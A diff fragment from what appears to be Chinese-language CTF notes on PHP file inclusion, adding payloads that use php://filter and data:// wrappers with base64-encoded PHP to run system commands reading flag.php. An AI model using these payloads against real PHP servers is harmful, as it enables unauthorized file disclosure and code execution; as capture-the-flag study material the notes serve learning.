@@ -166,6 +166,9 @@ c=?><?=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag
 
 c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=
 c=data://text/plain,<?php system("tac fl*g.php")?>
+
+//<?php system('cat flag.php');
+?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=
 ```
 **还有通过`|`符号或来得到我们想要的可见字符：这个办法用来解决eval("echo($c);");**<br>
 ```python
